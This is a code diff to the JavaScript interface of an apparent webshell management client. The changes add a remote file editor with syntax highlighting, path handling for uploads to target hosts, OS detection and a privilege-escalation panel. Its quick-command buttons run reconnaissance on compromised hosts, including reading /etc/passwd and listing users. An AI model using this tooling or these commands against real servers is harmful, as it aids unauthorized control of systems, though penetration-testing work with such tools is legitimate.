-    const sum = el('div', 'fs-hint', '开放 ' + open.length + ' / ' + ports.length + ' 个端口' + (open.length ? '：' + open.map((p) => p.port).join(', ') : ''));
-    body.appendChild(sum);
   }
 
   // UTF-8 字符串 <-> base64（靶机以 base64 回传文件内容，避免二进制/特殊字符破坏回显截取）。
@@ -1546,6 +1968,132 @@
     syncFsGutter();
   }
 
+  // ---------- 代码高亮（透明 textarea + 背后高亮层，保留编辑与行号对齐） ----------
+  function hlEscape(s) {
+    return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+  }
+
+  // 按扩展名判断语言；非代码文件返回 null（不高亮，保持纯文本查看）。
+  function hlLangByExt(name) {
+    const ext = (String(name).split('.').pop() || '').toLowerCase();
+    const m = {
+      php: 'php', inc: 'php',
+      js: 'js', mjs: 'js', cjs: 'js', ts: 'js', jsx: 'js', tsx: 'js', json: 'json',
+      html: 'html', htm: 'html', xhtml: 'html', xml: 'xml', xsl: 'xml', svg: 'xml', vue: 'html', tmpl: 'html',
+      css: 'css', scss: 'css', less: 'css',
+      py: 'py', pyw: 'py',
+      sh: 'sh', bash: 'sh', zsh: 'sh', csh: 'sh', ksh: 'sh',
+      asp: 'asp', aspx: 'aspnet', asa: 'asp',
+      sql: 'sql',
+      go: 'go', java: 'java', kt: 'java', scala: 'java', cs: 'java',
+      c: 'c', h: 'c', cpp: 'c', cc: 'c', cxx: 'c', hpp: 'c', m: 'c',
+      rb: 'rb',
+      vbs: 'vbs', vb: 'vbs',
+      yml: 'hash', yaml: 'hash', toml: 'hash', ini: 'hash', cfg: 'hash', conf: 'hash', env: 'hash', properties: 'hash',
+    };
+    return Object.prototype.hasOwnProperty.call(m, ext) ? m[ext] : null;
+  }
+
+  const HL_KW = {
+    php: new Set('function return if else elseif foreach for while do switch case break continue class public private protected static new echo print isset empty unset array true false null and or xor as use namespace try catch throw finally extends implements interface trait const var global include require include_once require_once die exit list each endwhile endif endforeach endswitch clone instanceof self parent abstract final'.split(' ')),
+    js: new Set('function return if else for while do switch case break continue var let const class new this super extends import export from default try catch finally throw typeof instanceof in of void delete yield async await true false null undefined NaN Infinity static get set'.split(' ')),
+    py: new Set('def return if elif else for while break continue class try except finally raise import from as with lambda pass yield global nonlocal assert del in is not and or None True False'.split(' ')),
+    sh: new Set('if then else elif fi for in do done while case esac function return export local echo cd source set unset read exit'.split(' ')),
+    sql: new Set('select from where insert update delete create drop alter table index view database schema join inner left right outer on group by order having limit offset as and or not null is in like distinct count sum avg min max case when then else end union all primary key foreign references default values set into'.split(' ')),
+    go: new Set('func return if else for range switch case break continue struct type interface map chan var const package import defer go select default nil true false iota'.split(' ')),
+    java: new Set('public private protected static final class interface enum extends implements new return if else for while do switch case break continue try catch finally throw throws import package void int long short byte float double boolean char String null true false this super abstract synchronized volatile transient instanceof'.split(' ')),
+    c: new Set('int char float double long short unsigned signed void struct union enum typedef static const volatile extern register auto if else for while do switch case break continue return goto sizeof struct class public private protected virtual template namespace using new delete true false NULL'.split(' ')),
+    rb: new Set('def end if else elsif unless then when case begin rescue ensure module class def do yield return require require_relative attr_accessor nil true false self'.split(' ')),
+    vbs: new Set('dim set let const if then else elseif end for each in next do while loop until select case function sub class private public call with new exit on error resume nothing true false empty null and or not xor mod is to step byval byref option explicit erase redim execute randomize rem stop wend'.split(' ')),
+  };
+  const HL_LIT = new Set('true false null nil None True False undefined NaN Infinity NULL'.split(' '));
+
+  // 注释风格不同的若干预编译 tokenizer（分组：注释 / 字符串 / 数字 / 单词）。
+  // 注释统一收进 group1（块注释与行注释都在同一捕获组），否则行注释无捕获组会
+  // 进入单词分支访问 m[4] 而抛错，导致整文件高亮失败。
+  const RE_CSTYLE = /(\/\*[\s\S]*?\*\/|\/\/[^\n]*)|("(?:\\.|[^"\\])*"|'(?:\\.|[^'\\])*'|`(?:\\.|[^`\\])*`)|(\b\d[\d_]*\.?\d*(?:[eE][+-]?\d+)?\b)|([A-Za-z_$][\w$]*)/g;
+  const RE_PHP = /(\/\*[\s\S]*?\*\/|#[^\n]*|\/\/[^\n]*)|("(?:\\.|[^"\\])*"|'(?:\\.|[^'\\])*'|`(?:\\.|[^`\\])*`)|(\b\d[\d_]*\.?\d*(?:[eE][+-]?\d+)?\b)|([A-Za-z_$][\w$]*)/g;
+  const RE_HASH = /(#[^\n]*|\/\*[\s\S]*?\*\/)|("(?:\\.|[^"\\])*"|'(?:\\.|[^'\\])*'|`(?:\\.|[^`\\])*`)|(\b\d[\d_]*\.?\d*(?:[eE][+-]?\d+)?\b)|([A-Za-z_$][\w$]*)/g;
+  const RE_SQL = /(\/\*[\s\S]*?\*\/|--[^\n]*)|("(?:\\.|[^"\\])*"|'(?:\\.|[^'\\])*'|`(?:\\.|[^`\\])*`)|(\b\d[\d_]*\.?\d*(?:[eE][+-]?\d+)?\b)|([A-Za-z_$][\w$]*)/g;
+  // VBScript：注释为 '（到行尾），字符串为双引号；分组顺序与其余语言一致（注释/字符串/数字/单词）。
+  const RE_VBS = /('[^\n]*)|("[^"]*")|(\b\d[\d_]*\.?\d*(?:[eE][+-]?\d+)?\b)|([A-Za-z_$][\w$]*)/g;
+
+  function hlHtml(src) {
+    const re = /<!--[\s\S]*?-->|<\/?[a-zA-Z][^>]*>|"[^"]*"|'[^']*'|&[a-zA-Z#\d]+;/g;
+    let out = '', last = 0, m;
+    while ((m = re.exec(src))) {
+      if (m.index > last) out += hlEscape(src.slice(last, m.index));
+      const full = m[0];
+      let cls = 't-wd';
+      if (full[0] === '<') cls = 't-tag';
+      else if (full[0] === '"' || full[0] === "'") cls = 't-st';
+      else if (full[0] === '&') cls = 't-lt';
+      else cls = 't-cm';
+      out += '<span class="' + cls + '">' + hlEscape(full) + '</span>';
+      last = m.index + full.length;
+    }
+    if (last < src.length) out += hlEscape(src.slice(last));
+    return out;
+  }
+
+  function highlightCode(src, lang) {
+    if (lang === 'html' || lang === 'xml' || lang === 'asp') return hlHtml(src);
+    let re = RE_CSTYLE;
+    if (lang === 'php') re = RE_PHP;
+    else if (lang === 'py' || lang === 'sh' || lang === 'hash') re = RE_HASH;
+    else if (lang === 'sql') re = RE_SQL;
+    else if (lang === 'vbs') re = RE_VBS;
+    const kw = HL_KW[lang] || HL_KW.c;
+    let out = '', last = 0, m;
+    re.lastIndex = 0;
+    while ((m = re.exec(src))) {
+      if (m.index > last) out += hlEscape(src.slice(last, m.index));
+      const full = m[0];
+      let cls = 't-wd';
+      if (m[1] !== undefined) cls = 't-cm';
+      else if (m[2] !== undefined) cls = 't-st';
+      else if (m[3] !== undefined) cls = 't-nm';
+      else {
+        const w = m[4];
+        if (w !== undefined) {
+          const lw = w.toLowerCase();
+          if (kw.has(lw)) cls = 't-kw';
+          else if (HL_LIT.has(lw)) cls = 't-lt';
+        }
+      }
+      out += '<span class="' + cls + '">' + hlEscape(full) + '</span>';
+      last = m.index + full.length;
+    }
+    if (last < src.length) out += hlEscape(src.slice(last));
+    return out;
+  }
+
+  // 依据文件名决定是否高亮；高亮层与 textarea 同步文本与滚动。
+  // 任何高亮异常都降级为纯文本查看（移除 has-hl 后 textarea 自身可见），
+  // 确保「高亮出问题」绝不会表现为「文件打不开 / 一片空白」。
+  function updateFsHighlight() {
+    const ta = $('fsContent');
+    const hl = $('fsHl');
+    const ed = $('fsEditor');
+    if (!ta || !hl || !ed) return;
+    const name = ed.dataset.name || '';
+    const lang = hlLangByExt(name);
+    if (!lang || ta.value.length > 400000) {
+      ed.classList.remove('has-hl');
+      hl.innerHTML = '';
+      return;
+    }
+    try {
+      ed.classList.add('has-hl');
+      hl.innerHTML = highlightCode(ta.value, lang);
+      hl.scrollTop = ta.scrollTop;
+      hl.scrollLeft = ta.scrollLeft;
+    } catch (e) {
+      ed.classList.remove('has-hl');
+      hl.innerHTML = '';
+    }
+  }
+
   // 读取文件到编辑器：GET /api/targets/{id}/fs/read?path=
   async function openFsFile(path, name) {
     try {
@@ -1553,9 +2101,11 @@
       $('fsEditName').textContent = name + '  (' + f.size + ' B)';
       $('fsContent').value = b64decodeUtf8(f.base64);
       $('fsEditor').dataset.path = path;
+      $('fsEditor').dataset.name = name;
       $('fsEditorBackdrop').classList.remove('hidden');
       $('fsEditor').classList.remove('hidden');
       applyFsWrap();
+      updateFsHighlight();
     } catch (err) {
       toast('读取失败：' + err.message);
     }
@@ -1604,10 +2154,28 @@
     }
   }
 
+  // 判断靶机路径是否为 Windows 形态：带盘符（C:\）或使用反斜杠。
+  function isWinFsPath(p) {
+    return /^[A-Za-z]:/.test(p) || String(p).indexOf('\\') >= 0;
+  }
+
+  // 拼接靶机文件路径：沿用当前目录已有的分隔符，不要混用 / 与 \。
+  //
+  // 为什么必须统一：cmd.exe 的内部命令（copy / del / type）自己解析路径参数，
+  // 把 / 当作「开关前缀」而不是目录分隔符；而 echo ... > 的重定向走 Win32
+  // CreateFile，会把 / 归一成 \。两者对同一条路径的解释不一致，就会出现
+  // 「文件确实被创建了（dir 能列出来），但后续 copy 读不回、del 删不掉」的怪象。
+  function joinFsPath(dir, name) {
+    if (!dir || dir === '.') return name;
+    return isWinFsPath(dir)
+      ? String(dir).replace(/[\\/]+$/, '') + '\\' + name
+      : String(dir).replace(/\/+$/, '') + '/' + name;
+  }
+
   async function uploadFs(file) {
     if (!file) return;
     const dir = state.fsPath === '.' ? '.' : state.fsPath.replace(/\/$/, '');
-    const path = dir === '.' ? file.name : dir + '/' + file.name;
+    const path = joinFsPath(dir, file.name);
     try {
       const b64 = await fileToB64(file);
       await post('targets/' + encodeURIComponent(state.current.id) + '/fs/upload', { path, base64: b64 });
@@ -1622,13 +2190,15 @@
     const name = prompt('新文件名（将创建于当前目录 ' + state.fsPath + '）：');
     if (!name) return;
     const dir = state.fsPath === '.' ? '.' : state.fsPath.replace(/\/$/, '');
-    const path = dir === '.' ? name : dir + '/' + name;
+    const path = joinFsPath(dir, name);
     $('fsEditName').textContent = name + '  (新建)';
     $('fsContent').value = '';
     $('fsEditor').dataset.path = path;
+    $('fsEditor').dataset.name = name;
     $('fsEditorBackdrop').classList.remove('hidden');
     $('fsEditor').classList.remove('hidden');
     applyFsWrap();
+    updateFsHighlight();
   }
 
   // ---------- PHP 环境能力研判（独立页） ----------
@@ -1666,8 +2236,8 @@
   // 渲染 phpinfo 能力研判：先给结论横幅，再列配置项与禁用函数。
   function renderPhpInfo(d, body) {
     body.textContent = '';
-    // ASP 靶机返回 kind:"asp"，走独立渲染；其余按 PHP 环境渲染。
-    if (d.kind === 'asp') { renderAspEnv(d, body); return; }
+    // ASP 靶机返回 kind:"asp"，ASP.NET 返回 kind:"aspnet"，均走独立渲染；其余按 PHP 环境渲染。
+    if (d.kind === 'asp' || d.kind === 'aspnet') { renderAspEnv(d, body); return; }
 
     const anyExec = !!d.anyExec;
     const exec = d.execFunctions || {};
@@ -1813,9 +2383,74 @@
     body.appendChild(extCard);
   }
 
+  // 快捷命令：按靶机系统类型显示不同命令
+  //   - ASP/ASPX 一定是 Windows，直接判定；
+  //   - php-eval / asp 支持 /api/sysinfo/{id}/os（轻量，仅取系统名），直接用返回的 os 判定；
+  //   - 其余类型（php-cmd / jsp 等不支持）或请求失败时，回退到按 shellType 猜测。
+  //   注意：这些声明放在 IIFE 作用域（而非 bind 内部），selectTarget 才能调用到。
+  const QUICK_CMDS = {
+    windows: ['whoami', 'ipconfig', 'systeminfo', 'tasklist', 'net user', 'netstat -ano', 'dir', 'ver'],
+    linux: ['whoami', 'id', 'uname -a', 'pwd', 'ls -la', 'ip addr', 'cat /etc/passwd', 'ps aux'],
+    mac: ['whoami', 'id', 'uname -a', 'pwd', 'ls -la', 'ifconfig', 'cat /etc/passwd', 'ps aux'],
+  };
+  function guessOS(target) {
+    if (target && (target.shellType === 'asp' || target.shellType === 'asp-vbs' || target.shellType === 'aspnet')) return 'windows';
+    return 'linux';
+  }
+  function renderQuickCmds(os) {
+    const box = $('quickCmds');
+    if (!box) return;
+    if (!os) os = state.current ? guessOS(state.current) : 'linux';
+    const cmds = QUICK_CMDS[os] || QUICK_CMDS.linux;
+    box.textContent = '';
+    cmds.forEach((cmd) => {
+      const b = el('button', 'chip');
+      b.dataset.cmd = cmd;
+      b.textContent = cmd;
+      box.appendChild(b);
+    });
+  }
+  // 把 php_uname() / PHP_OS 返回的 os 字符串映射到内部系统标识。
+  function osFromUname(os) {
+    if (!os) return null;
+    const s = String(os).toLowerCase();
+    if (s.includes('windows') || s.includes('winnt')) return 'windows';
+    if (s.includes('darwin')) return 'mac';
+    if (s.includes('linux')) return 'linux';
+    return null;
+  }
+  // 判定靶机操作系统：用轻量接口 GET /api/sysinfo/{id}/os 返回的 os 字段判定
+  // （php-eval 为 php_uname('s')，php-cmd 为 uname/ver，均为归一化后的 windows/linux/mac）。
+  // 这里刻意不用 /api/sysinfo/{id}（完整监控）：那会连跑多次 wmic 并做公网 IP 外网探测，
+  // 选中靶标时只要一个系统名，没必要等好几秒。
+  // 探测失败（接口不支持 / 不可达）时返回 null——由调用方决定是否按引擎类型猜测，
+  // 不在这里直接把猜测当真值返回，以免覆盖后端已持久化的真实系统类型。
+  async function detectOS() {
+    if (!state.current) return null;
+    const st = state.current.shellType;
+    if (st === 'asp' || st === 'asp-vbs' || st === 'aspnet') return 'windows';
+    try {
+      const info = await api('sysinfo/' + encodeURIComponent(state.current.id) + '/os');
+      const os = osFromUname(info && info.os);
+      if (os) return os;
+    } catch (e) { /* 探测失败：返回 null，交给 osOfTarget 用持久化值或引擎猜测 */ }
+    return null;
+  }
+
   // ---------- 事件绑定 ----------
 
   function bind() {
+    // 主题切换：启动时从 localStorage 恢复，切换时持久化
+    const themeSelect = $('themeSelect');
+    const savedTheme = localStorage.getItem('weshell-theme') || 'dark';
+    document.documentElement.setAttribute('data-theme', savedTheme);
+    themeSelect.value = savedTheme;
+    themeSelect.addEventListener('change', (ev) => {
+      const t = ev.target.value;
+      document.documentElement.setAttribute('data-theme', t);
+      localStorage.setItem('weshell-theme', t);
+    });
+
     $('btnSettings').addEventListener('click', openSettings);
     $('saveSettings').addEventListener('click', saveSettings);
     $('uaMode').addEventListener('change', (ev) => {
@@ -1830,11 +2465,13 @@
       if (state.current) openForm(state.current);
     });
     $('btnDelete').addEventListener('click', deleteTarget);
+    $('btnClearCache').addEventListener('click', clearModules);
     $('btnHistory').addEventListener('click', loadHistory);
 
     $('targetForm').addEventListener('submit', submitForm);
     $('shellType').addEventListener('change', updateTypeNote);
     $('targetForm').elements.param.addEventListener('input', updateTypeNote);
+    $('encoding').addEventListener('change', updateEncodingUI);
 
     document.querySelectorAll('[data-close]').forEach((btn) => {
       btn.addEventListener('click', closeModals);
@@ -1862,11 +2499,12 @@
       }
     });
 
-    document.querySelectorAll('.chip').forEach((chip) => {
-      chip.addEventListener('click', () => {
-        $('cmdInput').value = chip.dataset.cmd;
-        $('cmdInput').focus();
-      });
+    // 快捷命令点击：事件委托到容器，动态生成的 chip 也能命中。
+    $('quickCmds').addEventListener('click', (ev) => {
+      const chip = ev.target.closest('.chip');
+      if (!chip) return;
+      $('cmdInput').value = chip.dataset.cmd;
+      $('cmdInput').focus();
     });
 
     // 文件管理相关事件
@@ -1923,7 +2561,7 @@
     $('portsSearch').addEventListener('input', () => {
       if (state.current) renderPorts();
     });
-    $('scanBtn').addEventListener('click', loadScan);
+    $('scanBtn').addEventListener('click', scanBtnClick);
     $('scanHost').addEventListener('keydown', (ev) => { if (ev.key === 'Enter') loadScan(); });
     $('scanPorts').addEventListener('keydown', (ev) => { if (ev.key === 'Enter') loadScan(); });
     $('phpinfoRefresh').addEventListener('click', loadPhpInfo);
@@ -1934,6 +2572,30 @@
         state.phpinfoTimer = setInterval(loadPhpInfo, 3000);
       }
     });
+    // 提权面板事件：下拉选项由 PRIVESC_TOOLS 注册表动态生成，新增工具只需改注册表。
+    (function populatePeTools() {
+      const sel = $('peTool');
+      sel.innerHTML = '';
+      for (const key in PRIVESC_TOOLS) {
+        const opt = document.createElement('option');
+        opt.value = key;
+        opt.textContent = PRIVESC_TOOLS[key].label || key;
+        sel.appendChild(opt);
+      }
+    })();
+    $('peTool').addEventListener('change', selectPeTool);
+    $('peMode').addEventListener('change', syncPeMode);
+    $('pePreset').addEventListener('change', (ev) => {
+      if (ev.target.value) {
+        $('peCmd').value = ev.target.value;
+        if ($('peMode').value !== 'command') $('peMode').value = 'command';
+        syncPeMode();
+      }
+      ev.target.value = '';
+    });
+    $('peRun').addEventListener('click', runPrivesc);
+    $('peDeploy').addEventListener('click', runDeployCheck);
+    selectPeTool(); // 初始化默认路径与工具说明
     $('fsUp').addEventListener('click', () => {
       const p = state.fsPath;
       // 根目录（/、\、盘符根 C:\）无法再向上。
@@ -1989,9 +2651,12 @@
     document.addEventListener('keydown', (ev) => {
       if (ev.key === 'Escape' && !$('fsEditor').classList.contains('hidden')) closeFsEditor();
     });
-    $('fsContent').addEventListener('input', syncFsGutter);
+    $('fsContent').addEventListener('input', () => { syncFsGutter(); updateFsHighlight(); });
     $('fsContent').addEventListener('scroll', () => {
       $('fsGutter').scrollTop = $('fsContent').scrollTop;
+      const hl = $('fsHl');
+      hl.scrollTop = $('fsContent').scrollTop;
+      hl.scrollLeft = $('fsContent').scrollLeft;
     });
     // 窗口尺寸变化会改变软换行结果，弹窗打开时重排行号。
     window.addEventListener('resize', () => {
